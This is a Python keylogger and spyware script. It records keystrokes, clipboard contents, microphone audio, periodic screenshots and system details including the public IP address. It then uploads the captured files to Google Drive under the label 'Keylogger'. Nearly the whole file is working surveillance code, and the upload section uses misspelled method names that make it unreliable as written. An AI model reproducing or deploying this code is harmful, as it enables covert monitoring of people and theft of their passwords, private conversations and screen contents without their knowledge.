# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import base64
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from requests import HTTPError
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener, KeyCode
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import threading
from pydrive.drive import GoogleDrive
from pydrive.auth import GoogleAuth

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
username = getpass.getuser()


file_path = "./captures/"

is_esc_key_pressed = False

# contains all keystrokes capture
keys = []

# get the computer information
def computer_information():
    with open(file_path + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# get the clipboard contents
def copy_clipboard():
    global is_esc_key_pressed
    while(is_esc_key_pressed == False):
        with open(file_path + clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("Clipboard Data: \n" + pasted_data)

            except:
                f.write("Clipboard could be not be copied")
        time.sleep(30)

# get the microphone
def microphone():
    global is_esc_key_pressed
    fs = 44100
    seconds = 10

    # KMH TODO: Create repeated 10sec clips
    while(is_esc_key_pressed == False):
        audioName = time.strftime("%m-%d-%Y(%H-%M-%S)") + ".wav"
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_path + "audios/" + audioName, fs, myrecording)

# get screenshots
def screenshot_capture():
    global is_esc_key_pressed

    while(is_esc_key_pressed == False):
        imageName = time.strftime("%m-%d-%Y(%H-%M-%S)") + ".png"
        im = ImageGrab.grab()
        im.save(file_path + "screenshots/" + imageName)
        time.sleep(10)

def on_press(key):
    global keys
    keys.append(key)

def write_file(keys):
    with open(file_path + keys_information, "w") as f:
        f.write(str(keys))

def on_release(key):
    global is_esc_key_pressed
    if key == Key.esc:
        is_esc_key_pressed = True
        return False

# Main program starts here

# Clean out captures directory before starting
try:
    os.remove(file_path + "clipboard.txt")
except:
    print("clipboard.txt does not exist")
try:
    os.remove(file_path + "systeminfo.txt")
except:
    print("systeminfo.txt does not exist")
try:
    os.remove(file_path + "key_log.txt")
except:
    print("key_log.txt does not exist")

for screenshot in os.listdir(file_path + "screenshots/"):
    filename = os.fsdecode(screenshot)
    try: 
        os.remove(file_path + "screenshots/" + screenshot)
    except:
        print("there are no screenshots")

for audio_file in os.listdir(file_path + "audios/"):
    filename = os.fsdecode(audio_file)
    try: 
        os.remove(file_path + "audios/" + audio_file)
    except:
        print("there are no audio files")


# Grab system info
computer_information()

# Start audio
audioThread = threading.Thread(target=microphone)
audioThread.start()

# start clipboard
clipboardThread = threading.Thread(target=copy_clipboard)
clipboardThread.start()

# Start screen grabber
screenThread = threading.Thread(target=screenshot_capture)
screenThread.start()

# Start key logger
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

write_file(keys)

GoogleAuth().LocalWebserverAuth()
drive = GoogleDrive(GoogleAuth())

path = r"./"

for x in os.listdir(path):
    f = drive.CreateFil({'Keylogger': x})
    f.setCotentFil(os.path.join(path, x))
    f.upload()
    f = None

exit(0)